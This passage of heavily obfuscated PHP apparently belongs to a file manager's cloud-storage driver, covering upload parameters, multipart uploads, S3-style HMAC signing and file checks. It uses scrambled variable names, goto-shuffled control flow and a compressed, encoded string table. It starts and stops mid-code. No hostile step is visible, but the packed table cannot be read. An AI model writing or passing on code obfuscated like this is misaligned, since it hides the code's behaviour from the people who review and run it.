_get($fâ­‹å˜‘Í, $A…®Ÿ½à†’[227]); $fÔó´Ä„á = $fÔó´Ä„á ? $fÔó´Ä„á : _get($fâ­‹å˜‘Í, $A…®Ÿ½à†’[217], $A…®Ÿ½à†’[43]); return $fÔó´Ä„á; } public function uploadFormData($cïà›¿š¸š, $dŠµƒËìÚ¢ = 3600) { $e¶ƒâ†Åõ˜ =& $_SERVER[¾÷]; $eˆ·ŞùŒ Ë = $this->pathFather($cïà›¿š¸š); $d‰§äÖÒ·á = $this->client->getHttpUploadPostParams($this->bucket, $eˆ·ŞùŒ Ë, $e¶ƒâ†Åõ˜[200], $dŠµƒËìÚ¢); return array_merge((array) $d‰§äÖÒ·á, array($e¶ƒâ†Åõ˜[184] => $this->getHost())); } public function multiUploadFormData($d¹›‡ßîî‘, $f ÇÈ‰Œ´÷ = 3600) { $báôøŠ©Ó =& $_SERVER[¾÷]; $Bª“¢å½Å = gmdate($báôøŠ©Ó[228]); $DŠ¯¨ƒµØë = array(); $b˜ô¿Öç’Ë = $this->client->getUploadId($this->bucket, $d¹›‡ßîî‘, $DŠ¯¨ƒµØë); if (!$b˜ô¿Öç’Ë) { return !1; } return array($báôøŠ©Ó[229] => $b˜ô¿Öç’Ë, $báôøŠ©Ó[184] => $this->getHost() . $báôøŠ©Ó[18] . $this->pathEncode($d¹›‡ßîî‘), $báôøŠ©Ó[230] => $Bª“¢å½Å, $báôøŠ©Ó[102] => $d¹›‡ßîî‘); } public function multiUploadAuthData($fˆæÄ¬’Ù, $eéò‘§¥¼ğ = array()) { goto DËÏóš…™; E³Ï ˜‚„™: $B©ÏÍï°™‚ = array($d—Æ´ã·óŸ[232], $d—Æ´ã·óŸ[43], $d—Æ´ã·óŸ[128], $d—Æ´ã·óŸ[43], "\170\55\x61\x6d\172\55\x64\141\164\x65\72{$cÄã¹‡„}", $d—Æ´ã·óŸ[18] . $this->bucket . $d—Æ´ã·óŸ[18] . $this->pathEncode($E¥´“²İ¨) . $d¦Ö§´’†); if (strpos($d¦Ö§´’†, $d—Æ´ã·óŸ[233]) === 0) { $B©ÏÍï°™‚[0] = $d—Æ´ã·óŸ[234]; } if (isset($eéò‘§¥¼ğ[$d—Æ´ã·óŸ[235]]) && $eéò‘§¥¼ğ[$d—Æ´ã·óŸ[235]] == $d—Æ´ã·óŸ[236]) { $B©ÏÍï°™‚[0] = $d—Æ´ã·óŸ[236]; } goto E¬§‚¥âŠ; DËÏóš…™: $d—Æ´ã·óŸ =& $_SERVER[¾÷]; $cÄã¹‡„ = isset($eéò‘§¥¼ğ[$d—Æ´ã·óŸ[230]]) ? $eéò‘§¥¼ğ[$d—Æ´ã·óŸ[230]] : gmdate($d—Æ´ã·óŸ[228]); $d¦Ö§´’† = isset($eéò‘§¥¼ğ[$d—Æ´ã·óŸ[177]]) ? $eéò‘§¥¼ğ[$d—Æ´ã·óŸ[177]] : $d—Æ´ã·óŸ[43]; goto B‚é–à¢·×; C†Üò°Á™Ç: if (strpos($d¦Ö§´’†, $d—Æ´ã·óŸ[233]) === 0) { return array($d—Æ´ã·óŸ[239] => $EøÜÛªÕ¢ï, $d—Æ´ã·óŸ[230] => $cÄã¹‡„); } return $EøÜÛªÕ¢ï; goto C¶Ø°Óæ´õ; B‚é–à¢·×: $E¥´“²İ¨ = $eéò‘§¥¼ğ[$d—Æ´ã·óŸ[102]]; unset($eéò‘§¥¼ğ[$d—Æ´ã·óŸ[102]]); if (isset($eéò‘§¥¼ğ[$d—Æ´ã·óŸ[231]])) { $eéò‘§¥¼ğ[$d—Æ´ã·óŸ[230]] = $cÄã¹‡„; return $this->listUploadParts($E¥´“²İ¨, $eéò‘§¥¼ğ); } goto E³Ï ˜‚„™; E¬§‚¥âŠ: $f¡Ğç†´Ùç = implode($d—Æ´ã·óŸ[9], $B©ÏÍï°™‚); $a¢³–ìŠœñ = base64_encode(hash_hmac($d—Æ´ã·óŸ[237], $f¡Ğç†´Ùç, $this->secret, !0)); $EøÜÛªÕ¢ï = $d—Æ´ã·óŸ[238] . $this->accessKey . $d—Æ´ã·óŸ[14] . $a¢³–ìŠœñ; goto C†Üò°Á™Ç; C¶Ø°Óæ´õ: } public function listUploadParts($AÀÚÁ¯ÀÈÄ, $Aªšª©¹» = array()) { goto dà®¼¸·›Ô; Dš¨Ò‹Ìø÷: if (!$Eô†£ŞïŒ) { return !1; } unset($Aªšª©¹»[$ağÁ¼ŸŠí¯[231]], $Aªšª©¹»[$ağÁ¼ŸŠí¯[235]]); $Aªšª©¹»[$ağÁ¼ŸŠí¯[102]] = $AÀÚÁ¯ÀÈÄ; goto Dó•ÑñâŞŞ; Dó•ÑñâŞŞ: $bÖ’µ±æŠ = $this->multiUploadAuthData($AÀÚÁ¯ÀÈÄ, $Aªšª©¹»); if (empty($bÖ’µ±æŠ)) { return !1; } return array($ağÁ¼ŸŠí¯[239] => $bÖ’µ±æŠ, $ağÁ¼ŸŠí¯[230] => $Aªšª©¹»[$ağÁ¼ŸŠí¯[230]], $ağÁ¼ŸŠí¯[241] => $Eô†£ŞïŒ); goto CöÅâÃÌîë; dà®¼¸·›Ô: $ağÁ¼ŸŠí¯ =& $_SERVER[¾÷]; $bµöÀØÀ = str_replace($ağÁ¼ŸŠí¯[240], $ağÁ¼ŸŠí¯[43], $Aªšª©¹»[$ağÁ¼ŸŠí¯[177]]); $Eô†£ŞïŒ = $this->client->listParts($this->bucket, $AÀÚÁ¯ÀÈÄ, $bµöÀØÀ); goto Dš¨Ò‹Ìø÷; CöÅâÃÌîë: } public function getHost() { return parent::getHost() . $_SERVER[¾÷][18] . $this->bucket; } public function size($fÓáƒ­Á½õ) { $B—‰¨›‚Ğ = $this->objectMeta($fÓáƒ­Á½õ); return $B—‰¨›‚Ğ ? $B—‰¨›‚Ğ[$_SERVER[¾÷][87]] : 0; } public function info($AšÉ³šŠ) { if ($this->isFolder($AšÉ³šŠ)) { return $this->folderInfo($AšÉ³šŠ); } else { if ($this->isFile($AšÉ³šŠ)) { return $this->fileInfo($AšÉ³šŠ); } } return !1; } public function exist($c×åêØìˆ) { return $this->isFile($c×åêØìˆ) || $this->isFolder($c×åêØìˆ); } public function isFile($c¾ïÃñÚÓÁ) { return !$this->isFolder($c¾ïÃñÚÓÁ) && $this->objectMeta($c¾ïÃñÚÓÁ); } public function isFolder($eõ¤Ì®±æè) { return $this->cacheMethod($_SERVER[¾÷][207], $eõ¤Ì®±æè); } protected function objectMeta($cŸ¾»ö—„) { return $this->cacheMethod($_SERVER[¾÷][208], $cŸ¾»ö—„); } protected function _objectMeta($eÛ¡˜Íò) { $d«ä†ÜœÑ® =& $_SERVER[¾÷]; $eÛ¡˜Íò = rtrim($eÛ¡˜Íò, $d«ä†ÜœÑ®[18]); try { $D–Ó°¼Ñ‡ = $this->client->getObjectInfo($this->bucket, $eÛ¡˜Íò); if (!isset($D–Ó°¼Ñ‡[$d«ä†ÜœÑ®[227]]) && isset($D–Ó°¼Ñ‡[$d«ä†ÜœÑ®[242]])) { $D–Ó°¼Ñ‡[$d«ä†ÜœÑ®[227]] = $D–Ó°¼Ñ‡[$d«ä†ÜœÑ®[242]]; } } catch (Exception $e§İê³´Ì) { $D–Ó°¼Ñ‡ = !1; } if (!$D–Ó°¼Ñ‡) { } return $D–Ó°¼Ñ‡; } protected function _isFolder($A—¨µõÕŠº) { goto FÚë±‰±; FÚë±‰±: $BĞµ ëÂ =& $_SERVER[¾÷]; $A—¨µõÕŠº = rtrim($A—¨µõÕŠº, $BĞµ ëÂ[18]); if ($A—¨µõÕŠº == $BĞµ ëÂ[43] || $A—¨µõÕŠº == $BĞµ ëÂ[18]) { return !0; } goto cœ‘¾÷¡£; cœ‘¾÷¡£: $Fõ‰¨ê’†‹ = $this->client->getBucket($this->bucket, $A—¨µõÕŠº, null, 1); if (empty($Fõ‰¨ê’†‹[$BĞµ ëÂ[206]])) { return !1; } $A™£áÛ‹± = $Fõ‰¨ê’†‹[$BĞµ ëÂ[206]][0][$BĞµ ëÂ[38]]; goto e“Œò¹ƒ¾; e“Œò¹ƒ¾: if (substr($A™£áÛ‹±, -1) == $BĞµ ëÂ[18]) { return !0; } if (get_path_this($A™£áÛ‹±) == get_path_this($A—¨µõÕŠº)) { return !1; } return !0; goto dÕÓ–•ï—; dÕÓ–•ï—: } } goto b¢‰ÒŒš¹š; a•ô½©Í‰ã: if (!function_exists('_kodDe')) { function _kodDe($BÙŞÇœÔ«) { $BÙŞÇœÔ« = base64_decode($BÙŞÇœÔ«); $b°¤³ñİ¥² = strlen($BÙŞÇœÔ«); $c­Æ±§Œ¦š = ''; $C»Ì­ã°¶Ì = ord($BÙŞÇœÔ«[0]) - 30; for ($d¦‘Ÿƒ¦îå = 1; $d¦‘Ÿƒ¦îå < $b°¤³ñİ¥²; $d¦‘Ÿƒ¦îå += 2) { if ($d¦‘Ÿƒ¦îå + 1 < $b°¤³ñİ¥²) { $c­Æ±§Œ¦š .= chr(ord($BÙŞÇœÔ«[$d¦‘Ÿƒ¦îå + 1]) + $C»Ì­ã°¶Ì); $c­Æ±§Œ¦š .= chr(ord($BÙŞÇœÔ«[$d¦‘Ÿƒ¦îå]) + $C»Ì­ã°¶Ì); } else { $c­Æ±§Œ¦š .= chr(ord($BÙŞÇœÔ«[$d¦‘Ÿƒ¦îå]) + $C»Ì­ã°¶Ì); } } return $c­Æ±§Œ¦š; } } define("\276\367", "\x9a\xf0\x92\xce\xa7\xa5\xe3\x90\xa4\xeb"); $_SERVER[¾÷] = explode(base64_decode('fAJ8BHwC'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\xad\x7d\x9\x7c\x54\xd5\xf5\xb0\x2b\xa8\x45\xab\xff\xd6\x62\x8b\xe8\x33\x80\xd9\x66\x49\xc2\x1e\x8\x61\x92\x4c\x92\x81\x49\x26\xce\x4c\x80"."\110\140\170\231\171\231\171\311\314\274\311\173\157\222\114\0\327\272\201\2\56\40\150\335\367\12\132\53\52\242\330\126\305\152\21\253\165\245\256\40\240\150\305\252\25"."\xeb\xda\xef\xee\xf7\xbe\x37\x13\xfb\xff\x7e\xdf\x87\xc2\xbc\x7b\xee\x7e\xef\xb9\xe7\x9e\x73\xef\x39\xe7\x6e\xbc\x70\xd9\x11\xcb\x8e\x5a\x76\xc4\xea\xfd\xf8\x77\xd9\xe1\xcb\x8e\x5e".base64_decode('NgJ/n77ymMPQnyNXrigpaZ5yXHnrqNWbN8kb5U3yyoB/x/O+41/YOMe7/7Yd')."\271\375\207\37\366\372\212\276\110\65\110\214\363\106\344\156\65\251\204\324\41\305\227\266\103\160\30\206\42\161\305\214\104\265\264\251\244\115\3\203\353\74\41\137\175"."\244\315\23\156\306\141\71\223\161\33\261\136\303\55\353\321\204\332\257\370\325\56\167\227\232\166\307\144\123\166\201\17\234\352\70\374\63\11\377\104\23\112\264\67\42".base64_decode('d2m6qcQwKJtOqulesSX4uxr/SGnNlJRB1aDNAI3qVuP4m1bixj9GX1I1SfZI')."\x6b\x20\x1c\x9\xb5\xb7\xb5\x79\x83\xe1\x8\x29\x51\x8c\x4f\x69\x31\xf2\x95\x91\x75\x39\x45\xa\xcf\x28\xba\x1\xaa\x12\x8b\x8b\x64\xb4\x8c\x92\xb6\x40\x38\x0\xf6\xb5\x4b\x36\x48".strrev('ƒ…*×É·Wk:°¥5a›¬¦C>„8sÑV_H®ŠIy´w	Ğ?›o‘u'."\r".'I')."\x9e\xd6\x90\xa7\x3e\xec\xb\xb4\x62\x70\x7d\xa0\xa5\xc5\x17\xce\x87\x7\x3\x7e\x7f\x9d\xa7\x7e\x6e\x7e\x4c\x5b\xd0\xd3\xd4\xe2\x91\x40\xfb\xc0\x6c\xaa\xe9\x6e\xad\x44\x5a\x82\x63"."\226\110\245\370\243\121\125\222\144\26\322\62\155\216\231\313\220\257\60\373\2\163\220\316\46\223\70\320\312\276\110\373\225\156\71\233\44\143\326\40\6\62\272\232\222".base64_decode('adfnKjkGJQiUNTU1HcUB76CpyxwOWhzVlRTAPgwLef3e+rAEmyk1BgMtEpmK').base64_decode('lGyYii7Nb/YGvRJsek0x6nGxhPO1t4IBkTx+vzRcCaaSytBicJ4ChQWCDd6g').base64_decode('VNch8XGKaqmUlnaBUsB8mkJTvcEg/nAQDPb74NSRQKCxMeRlIdK5s/ygJRMJ')."\x96\x5a\x42\xb1\xee\xa4\x19\xe9\x97\x93\x59\x8a\xac\x64\xa5\x14\x93\x1f\xf2\xab\x19\x4\x81\xfb\xd4\xb4\x9a\x25\xc8\x4a\x8a\xd0\x34\xb6\x72\xc8\x47\x96\xa6\x56\x28\x24\x5\xb2\x69"."\x64\x4d\x81\x5\xd6\x8f\x3f\x6b\x66\xe1\xdf\x19\x24\x51\x17\xa4\x8\xfd\x8a\x6e\x46\x94\x74\x54\x8b\xa9\x69\xb2\xc\x6b\xc9\x92\x23\x88\x27\x9b\x89\x6\x1d\x10\x4\x9d\x14\xa8\xb9".strrev('ü°JXşqtéŒ”:	1)³ZBÆt†1v@g:)Œ–·YVÏÅôõ¢×&Z¢')."\325\356\34\137\204\206\226\325\243\200\42\166\153\74\157\33\153\111\45\111\244\230\46\350\264\101\373\325\236\111\152\162\54\244\350\102\137\33\101\306\100\326\24\201\131"."\x94\xac\x51\xd3\x53\xd\x80\x5c\x90\xfa\xc1\x22\x51\xdb\xb\x44\xf4\xd2\x65\x12\x13\x86\xd0\x45\xc8\x5c\xc9\xc2\xf3\x9d\x3f\x2c\x5a\x38\x1b\xfc\x53\x4a\x68\x5e\x27\x69\x5a\x42\x49"."\46\43\312\240\102\226\123\52\66\331\240\175\165\33\220\54\3\10\16\372\2\221\204\154\44\132\142\223\43\50\27\45\245\61\145\320\225\111\144\310\212\147\213\274\323"."\x82\xee\x70\x76\x5a\x35\xd3\x2b\x10\xe4\xa4\x16\x95\x93\x62\x4f\xf1\x77\xc2\x34\x33\x21\x25\x1d\x6b\x64\x14\x3d\xa6\xd\xa4\xd1\x80\x65\x14\x4a\xfc\x1b\x1c\x52\x4c\x6a\x91\x3a\xa4"."\xe6\x6a\xb5\xda\xa0\x19\x53\x49\xf6\x45\x7b\xc7\x60\x6\x3\x9a\x83\x4\x63\x8a\x48\x58\x19\x34\xc9\xa0\x48\x33\xa2\x9\x59\x7\xd3\x55\x93\x35\xbb\x9d\xd3\xd8\x7e\x95\x54\xa3\xb2"."\xa9\x6a\x69\xb7\x16\x35\x15\xd3\x69\x98\xba\x22\x93\xd2\x3c\xd1\xa8\x62\x18\xce\x7a\xb0\xe5\xe9\x5a\xd2\xe9\x49\x26\xb5\x1\x67\x40\x57\xe3\x6a\xba\x5a\x2a\x23\x44\x18\xef\x87\x4e"."\110\30\253\311\332\55\232\41\101\134\201\164\241\14\327\106\327\44\113\255\313\151\243\133\321\235\136\262\150\252\45\60\37\214\56\322\144\15\252\221\321\14\25\66\257".base64_decode('WpJNU44mIE3hxdf8SHoVbqJKXlrvYEbVFYO2VWpqCZNCQOmKs02X4ym5Wspk').strrev('\'€œ4ÌJ©ip-ºûÉØ*N '."\n".'êtÃYRè0¢–©¡“S†'."\0".'[ÕÈÀ»')."\126\114\222\0\332\110\64\16\103\233\303\341\266\210\257\21\154\325\255\336\110\213\47\134\117\70\13\257\51\307\151\233\375\200\62\263\42\51\160\201\23\54\61\210\130".base64_decode('raCvHNimDSg6qLguVy31arEubdBFoxoJh0MTw+nOmM6gnI7D8enKmQpBP6M/')."\156\35\150\277\222\216\233\11\232\61\344\15\316\363\6\43\241\100\143\170\276\47\110\66\371\64\300\222\101\132\25\54\72\351\14\52\61\60\364\121\223\346\223\63\160"."\324\150\32\270\60\340\134\321\130\270\130\150\234\337\327\4\7\246\301\151\200\104\116\61\25\55\333\257\246\124\330\166\223\305\240\221\4\34\100\23\151\220\33\165\250"."\246\63\121\126\322\31\53\57\165\202\177\313\112\27\166\66\270\312\26\325\272\125\236\307\135\351\252\224\252\52\246\110\155\200\45\121\345\244\104\72\235\227\242\102\12".strrev('ƒœ\\‹?Ä-Òixkòù^'."\r".'H7'."\r".'âÒ8PŞíYïA‡Cm¬°–;€‘ıÌ').strrev('ÊP¬H£!\'.š’Õ–?Ò	ãQY°aÆJ1«æ5ßV+¦‹PÃJ¸ä¥÷9').base64_decode('V7vJ/GCCyQMhNZWhdM1MZFNdwiflRsF80+0lobHtDbC+ZKN3k4QTqhopZXaH')."\x26\x82\xff\x39\x19\x8e\x69\x29\x99\x32\xb9\x88\x24\x29\x31\x4c\x93\x30\xa8\xcc\x12\xd3\xac\xc8\x7c\xbf\x34\x75\x53\x83\x50\xdd\x92\xa4\x45\x31\x13\x1a\x99\x24\xc0\xe1\x93\x26\x65"."\x59\xdb\x68\x2b\x63\x4a\x52\xa1\xa3\x91\x50\x28\x49\x7\x9c\x5b\x3f\x1b\x24\xce\xa9\x3\x46\xd\x40\xf9\x5e\xaa\x1a\x41\x90\x5\x32\x4e\x34\x3c\x1f\xf2\xb7\x1c\x60\xb2\xa4\x49\xb0"."\x8d\x4\xba\x7a\xc0\x3a\x21\x2c\x84\x6a\x34\xa\xbb\x7e\x44\x43\x71\xa0\xd5\x32\x4f\xdf\xa6\x2b\xdd\x2a\x59\x6d\x69\x30\x55\x2d\xb2\xde\x4b\x33\x80\xa9\xe1\xfb\xd\xc\x8\x85\x35"."\266\373\375\221\372\100\153\30\360\314\30\62\77\350\13\173\51\162\172\32\42\236\372\66\266\173\362\251\46\11\40\245\310\337\6\60\244\277\112\330\202\370\136\305\251".base64_decode('ON1jIZXG34AsZ7S0oTiJkOWMcXqOU8ywEfO8HJxTH3TKqSFnCgyTkzXdurVK')."\x61\x71\x87\xf6\x91\x9\xe5\x74\x1b\xe\x2c\x10\x84\xe8\x9e\xde\x16\x8\x91\xc\xb5\x10\xa\xd8\xa6\x2e\x45\x27\xed\x68\x6b\x27\x51\x29\x1\x99\x9a\xbc\x61\xba\x3f\xcb\x84\x5b\xf2"."\xcc\xf\x51\x62\x9b\x5\x9\x75\x75\x48\xe6\x9d\xab\xa5\xd\x21\x85\xe\xa6\x92\x9c\x5\xb4\x76\xc7\xc9\x27\x21\xdc\xec\x6b\x9d\x1b\x69\x9\x34\x78\xfd\x11\x5f\x2b\xa0\x44\xe1\x7c"."\170\173\133\203\207\316\252\10\257\13\120\301\225\100\333\1\55\232\347\361\373\354\311\275\13\174\241\160\250\140\24\200\265\173\155\61\100\350\153\13\172\33\175\13\130"."\xb0\xd1\xe7\xf5\x37\x84\x22\xf5\x9e\xfa\x66\x9e\xa6\xd5\xd3\x42\x2\x91\x6e\x28\x76\x19\x6e\x6b\xfa\x8\x20\xaa\x21\x26\xbc\x45\xfa\xa1\x20\xaa\x31\x1\x5d\x94\x94\x22\x54\x6\x88"."\160\4\0\33\244\102\220\216\164\27\212\277\250\47\204\53\217\152\131\212\206\214\61\114\121\72\222\222\311\172\222\351\346\127\202\177\112\45\117\110\62\63\21\106\61"."\xba\x72\xec\x13\x75\x83\x86\x1\xb\x48\xea\x97\x8\x81\xcf\x6b\x41\x4\xa6\xa9\x53\xba\x19\xad\x2e\xc\xf0\x74\x9b\x6c\xf9\xdb\xc2\x60\x41\xf0\x38\x30\x3\x1e\x24\x67\x3\x4c\x40".strrev('´äÙA0Êş'."\0".'Ú$2DÚĞ0~drè7›@‘¸Ë›§6‡Š'."\0".'Ì‹¡3')."\13\160\73\62\25\232\370\240\367\150\164\50\227\341\237\63\361\17\140\364\110\345\112\232\216\172\27\244\337\214\42\220\217\156\260\32\50\355\325\262\254\266\56\115\113".strrev('©zÔÄH kB'."\0".'FÀHp³#[zæ	dbnœ§T¤$Pcİˆ˜F|ö'."\n".'Ò')."\x8\x85\x23\x83\xde\x10\x5d\xde\xba\xd2\x97\x55\xe9\x70\xb9\x5d\xe5\x4\x8b\x15\xb0\x4d\x91\xea\xdd\x8b\x3b\x7\xca\x4b\x16\x3a\xcb\x5d\x8b\xc0\x47\x69\xd9\x6c\x1c\x24\xa1\x4e\x97"."\x25\x38\x9e\xe4\xcf\xea\x2c\x37\x64\x85\x4a\x8c\xda\xd2\xea\x4e\x77\xa7\xbb\xa4\xb6\x7a\xa1\xc7\x39\x24\x3b\x87\x2a\x9c\xd3\x9d\x8b\xca\x3b\x5d\xa5\xe5\x4\xb0\x68\x69\x95\x63\xd2".strrev('æŒ<@êÍÖ–´¬¨°9×éÑŸ—W;Ù’ÎytèNÖtÔü·¬$'."\0".'˜r').base64_decode('WFNj5SWgSYBFYknSiNYJCWjEkJrh0KVTllM4mEMlznMsdHaWL6oV8gkge12A')."\75\2\204\67\301\322\171\234\147\303\236\261\254\160\335\23\374\310\246\243\234\172\302\165\321\45\107\11\35\120\343\151\266\204\300\276\317\304\162\53\147\276\164\2\376"."\135\116\47\62\256\14\122\322\220\356\126\165\202\235\331\264\332\107\17\33\322\112\37\371\320\114\212\337\135\212\71\240\120\364\0\160\113\30\40\7\25\5\101\224\20"."\x4a\x22\x46\x90\xd4\xc0\x45\x32\x5\xc9\x27\xa4\x17\x99\x8\xe4\xc2\x6\x58\x28\xa6\xa4\xc9\x3c\x1d\x4b\x52\x1b\x51\x39\xa3\x84\x84\x1e\x46\x22\x61\x4f\x9d\xdf\x1b\xa1\x14\x86\x50"."\x62\x1a\x46\x54\xb1\x8e\x1d\xcf\x81\xae\x71\x8a\x4a\xe9\x43\x94\xb3\xe5\x48\x2\x21\x2b\xdf\xe8\x4b\x4a\x88\x30\x48\x8a\xae\x6b\x7a\x35\x3a\x86\x34\xb2\x19\xc8\xbe\x1\x69\xcb\x4"."\143\53\1\121\135\252\231\45\341\41\47\371\42\342\4\144\144\312\62\100\351\231\261\1\356\222\316\316\354\102\45\266\150\41\100\152\331\331\275\150\351\304\345\245\224"."\x2b\x77\x77\x82\x3f\x34\x80\x69\x19\x69\x7d\x86\xcf\xa5\x1\xd8\x33\xca\x32\x79\xa\x9c\x96\x45\x18\x35\x8c\x80\x8d\xd9\x5\xdb\xc1\x4e\x3e\x2c\x1\x16\x8d\x83\x9a\xce\xb8\xa5\x8c"."\x85\xd1\x36\x35\x53\x4e\x5a\x8a\x8\x43\x8\x25\x4d\x74\xe3\x26\x87\x4\x78\xb6\xfd\x9c\x62\xc1\xad\x5c\x38\x6c\x44\xe4\xb4\x95\x9d\xa4\xb1\x23\xf\xe1\x9c\xb\xe6\x8\x29\xa6\x8b"."\245\160\10\221\370\337\232\42\112\341\323\140\15\325\13\373\33\76\246\11\345\14\123\111\131\16\44\15\5\236\125\67\146\223\111\223\361\370\111\265\227\24\113\26\310".strrev('àXKIÁ¯ˆ»&7pJ´õïÀ@º¥Zù,V^7	ŠJ–+'."\0".'y6A¾Aj=5iB’')."\xf4\x35\xe0\x6f\xf6\xa1\xc6\xe8\xe0\x2\xa\x65\x52\x28\x39\x97\x22\x21\xc8\xd\x3a\xe0\x11\x8c\x3\x6e\xfd\xe\xd0\x2e\x7\x94\x69\x1c\x9c\x3\x77\xf0\x83\x2d\x7\xe3\x7f\x1d\x84".strrev('AÔ6ƒ‘mI+ô¯É·œå$1f´QEÊ³5Cƒ_O’·Èn6²˜v-').base64_decode('eXYHEr4aSGvaAeqS1qBPQMsSDjitEKsc/LyNVCcICQ4uQDjiupbNtNGahBBu')."\14\1\360\226\62\100\120\323\114\7\225\6\35\371\202\142\341\41\53\334\164\64\306\366\272\11\125\305\35\41\42\356\162\272\45\130\4\17\76\352\24\141\223\12\17"."\301\161\341\137\363\70\226\303\252\33\345\176\21\17\12\341\4\45\314\24\177\370\11\65\77\111\345\214\242\135\126\263\237\203\302\112\303\162\74\44\124\147\312\161\132"."\x57\x81\x58\xfc\x1d\x54\xa2\xb9\x28\x97\xf7\x1a\x4\xf1\xd1\x1a\x62\xd8\x83\x50\xb9\x10\x3e\x16\x9e\x2\x86\x63\xc\x5d\x8f\x3b\xf6\x58\x3a\x90\x14\xf1\x18\x46\x5a\xf0\x75\xd8\x5".base64_decode('wvsUyPC9FVKzEKDyAr2ioAAnj1nCC8gG4crh4Sb5UiiMd0UcbNQfO4COjqVe')."\x18\xe4\x88\x42\x87\x40\x82\x15\x38\x84\xdd\xb\x22\xb6\x93\x4f\xb9\x10\x24\x3f\xaa\x16\xc1\xe3\x1e\x49\x31\x49\x9a\x4d\x84\x8d\xb6\xc2\x79\x69\x53\xd3\x39\x35\x2d\x1e\x71\x70\x28"."\47\317\174\167\200\210\153\73\224\151\30\356\33\223\57\176\204\342\40\107\53\16\170\13\50\20\161\56\306\203\326\243\33\111\336\166\122\222\255\345\164\215\223\116\267"."\3\361\60\142\103\134\202\262\11\131\347\143\112\127\30\104\163\176\160\4\223\360\240\220\254\133\356\347\73\227\45\217\260\116\14\63\107\133\57\176\132\13\305\301\206"."\341\2\315\114\352\55\24\24\227\240\152\370\331\15\252\365\33\365\64\254\25\14\302\103\30\372\255\41\374\247\167\240\226\15\10\311\215\45\24\106\166\262\210\40\115".base64_decode('spVpzYcb6GHEDbB6SUB8dRdcTE2QlorEkREzA9Jt/C0kytjJrmVbyAPlJ2Qb').strrev('|±l!QÎbägp£I—l!’'."\n".'½ÒÅ,Ø°‰0c¤£&y`Št-Êòj'."\r".'„')."\175\57\65\20\303\102\110\351\162\333\260\231\100\22\354\222\165\227\16\352\347\55\347\244\203\260\136\131\6\130\104\72\202\12\55\224\3\307\370\65\52\106\300\365\343"."\x8d\xa9\x26\x84\x40\xf2\xa8\xd1\x63\x41\x9e\x50\xb8\x2f\x63\x30\x91\x7a\xc1\x31\x73\xe5\x4d\x16\xe7\xb0\x1c\x13\x2c\x29\xb\x6d\xd\xae\x32\x44\xcd\x5d\x7c\xf3\x12\xb7\x3e\xf1\x4a".strrev('q"òKJ….!9'."\0".'›QølT…BñD-AÇ†Z˜eĞnÅ<úá/â*^').strrev('.6ï±X(¸â×çíîDBÙSÑà‚('."\0".'š‡‚Á4S®¾×GR	+½ã')."\71\26\13\320\103\106\361\73\77\251\170\364\122\270\40\244\251\300\212\22\102\205\223\173\222\111\176\221\151\17\17\233\5\257\131\61\223\10\31\66\133\43\142\373\351"."\x8d\x43\x21\x18\xe3\x2c\x45\x66\xcc\xca\x7c\xf1\x6b\x65\x3b\x93\x66\xa5\x4b\xc3\xef\xe4\xc3\x10\x28\x3e\xa1\x85\xc3\x60\xd7\xab\x4f\xa8\x69\xc5\x60\x9b\x97\x6e\x14\xe8\x31\xc4\xcc"."\xe1\xa6\x9\xc6\x9\x87\x63\x40\xfe\x3\x0\x71\x5f\x60\x27\x40\x9c\x28\x8\x5b\x1f\xda\x46\x22\xa6\x65\xd3\xe\xa2\x32\x4\x54\xb5\x8c\x3e\x58\x1a\x78\x24\x1b\x75\x2d\xe5\xb\x0"."\324\57\214\17\366\164\12\75\3\103\24\146\120\55\324\121\60\177\160\307\37\256\114\32\315\212\342\354\301\73\167\274\366\247\257\166\341\357\255\53\236\303\37\323\247".base64_decode('kBP5ZUeC//K0pi5asFB765mTzyl58d3dbx3VtPO+r85RPyq6d1tz+f2b/74y').base64_decode('9mfVP+q53frm8ZfMPeGhx34bueDhy75YU+QN3Vx69mbPTzbPvn7a7JVHtbx4')."\x6e\xa8\xe3\x2f\x7f\xf8\x70\x8d\xd1\xfd\xec\xda\xdb\x5e\x99\xf2\xf8\xc4\x78\xf7\xb\xbf\xd9\x31\xe0\xaa\x7f\xfc\xf3\xb1\x3d\x7b\xfe\xfc\xee\xfb\xe7\xfe\xe1\xa6\xd1\xb5\xe\xe9\xbe"."\123\66\135\41\155\134\67\346\344\316\173\256\75\112\331\337\66\166\172\364\361\113\63\317\176\136\375\160\342\260\113\236\133\261\273\254\354\232\162\145\321\350\153\326\34"."\175\171\265\171\331\221\225\115\117\324\256\232\131\171\350\206\104\343\224\147\172\174\337\235\173\315\256\314\234\175\317\316\136\165\233\367\214\23\46\225\177\76\312\363\346"."\155\346\175\107\335\264\163\157\152\314\223\17\215\152\274\373\365\375\167\311\47\165\370\323\223\22\173\53\327\124\164\115\132\243\307\266\257\375\352\364\325\43\17\357\57"."\175\152\116\375\310\247\202\247\34\130\166\134\323\205\207\155\172\350\305\63\106\274\360\77\235\247\76\237\371\313\245\215\163\106\354\351\176\253\342\340\252\125\217\135\175"."\117\377\314\203\77\171\162\354\236\15\203\153\277\112\375\147\325\326\371\157\157\37\171\176\240\276\102\71\57\176\335\312\365\162\357\234\327\147\150\47\353\55\327\314\320".strrev('„û¹O…³ş£y¶ä³Ù]>[¸ôğà?»ñô\\7yçùM‡UŞÃöö')."\x8b\xc7\x56\xae\xf7\xff\x69\xf3\x27\xe6\x8b\xa7\x9f\xb6\xe2\xb3\x83\x4b\xb6\xbc\xfc\xab\x44\xc7\xdf\x2e\x4e\xd5\xbc\x5c\xd4\xf8\xd0\x82\xf2\xf\xd7\x1e\xf1\xef\x83\xaf\x5c\x9a\xb9"."\247\115\133\62\352\234\355\37\314\15\376\366\232\262\241\261\153\217\366\76\262\156\343\53\45\257\367\354\253\153\157\163\154\75\373\225\312\167\225\71\57\236\264\343\230".base64_decode('vgcWTxxzzLSb5BsO7Bx6IAhk7ssOv6Z23OCGu865fGXmyPJrdp3y6qjbNs7/').base64_decode('7YbvT9g3+JuGi8+vrzj0lyuSty2eurFx+7NF093njBgfq9lTcvr9xz7pTS/Y')."\x56\xe4\x7c\x7b\xba\xfe\xe2\xaf\x46\x1e\xf1\x51\x2e\xf9\x86\x19\xf9\xa6\xef\x16\xf7\xca\x2d\xdd\xe1\x2d\xbd\x7f\x3c\x78\xea\x69\xef\xbd\xf8\x5c\x75\xec\x8d\xb1\x67\xde\x5a\x1f\xee"."\72\54\263\336\61\266\150\164\374\203\261\247\136\160\336\151\317\164\277\371\314\63\217\157\172\261\373\327\347\147\177\236\151\36\363\307\247\232\344\